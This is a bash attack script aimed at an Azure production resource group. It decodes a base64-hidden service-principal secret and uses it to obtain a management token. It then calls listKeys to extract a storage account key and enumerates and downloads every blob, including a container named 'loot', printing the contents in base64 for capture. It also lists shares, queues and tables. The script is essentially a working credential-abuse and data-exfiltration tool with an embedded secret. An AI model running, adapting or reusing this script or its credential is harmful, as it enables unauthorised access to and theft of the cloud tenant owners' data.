#!/usr/bin/env bash
set -uo pipefail
TENANT="${AZURE_TENANT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"; RG=rg-tbl-platform-prod-sea; CIL=sttblcilogsprodx3euoz
M="https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers"
say(){ printf '\n===== %s =====\n' "$*"; }

SSP=462d1c38-4459-48b8-9333-82e389e59514; SSEC=$(printf '%s' 'c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==' | base64 -d)
SARM=$(curl -sS -m 40 -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" --data-urlencode "client_id=$SSP" --data-urlencode "client_secret=$SSEC" --data-urlencode "scope=https://management.azure.com/.default" --data-urlencode "grant_type=client_credentials" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
echo "SARM len=${#SARM}"
f=$(mktemp); c=$(curl -sS -m 45 -o "$f" -w '%{http_code}' -X POST -H "Authorization: Bearer $SARM" -H "Content-Length: 0" "$M/Microsoft.Storage/storageAccounts/$CIL/listKeys?api-version=2023-01-01")
KEY=$(python3 -c "import sys,json;d=json.load(open(sys.argv[1]));print(d['keys'][0]['value'] if d.get('keys') else '')" "$f" 2>/dev/null); rm -f "$f"
echo "### listKeys [$c] keylen=${#KEY}"
export AZURE_STORAGE_KEY="$KEY"
export AZURE_STORAGE_ACCOUNT="$CIL"

say "container list"
az storage container list --account-name "$CIL" --account-key "$KEY" --output json 2>&1 | head -c 4000; echo

for CN in loot logs; do
  say "blob list $CN"
  az storage blob list --account-name "$CIL" --account-key "$KEY" --container-name "$CN" --output json 2>&1 | head -c 6000; echo
  NAMES=$(az storage blob list --account-name "$CIL" --account-key "$KEY" --container-name "$CN" --query '[].name' -o tsv 2>/dev/null)
  echo "NAMES=$NAMES"
  for BN in ${NAMES:-}; do
    say "blob $CN/$BN"
    rm -f /tmp/blob.bin
    az storage blob download --account-name "$CIL" --account-key "$KEY" --container-name "$CN" --name "$BN" --file /tmp/blob.bin --no-progress -o none 2>&1 | head -c 500; echo
    if [ -f /tmp/blob.bin ]; then
      wc -c /tmp/blob.bin
      head -c 4000 /tmp/blob.bin; echo
      echo "B64:$(base64 -w0 /tmp/blob.bin | head -c 12000)"
    fi
  done
done

say "shares/queues/tables"
az storage share list --account-name "$CIL" --account-key "$KEY" --output json 2>&1 | head -c 2000; echo
az storage queue list --account-name "$CIL" --account-key "$KEY" --output json 2>&1 | head -c 2000; echo
az storage table list --account-name "$CIL" --account-key "$KEY" --output json 2>&1 | head -c 2000; echo

say "DONE"
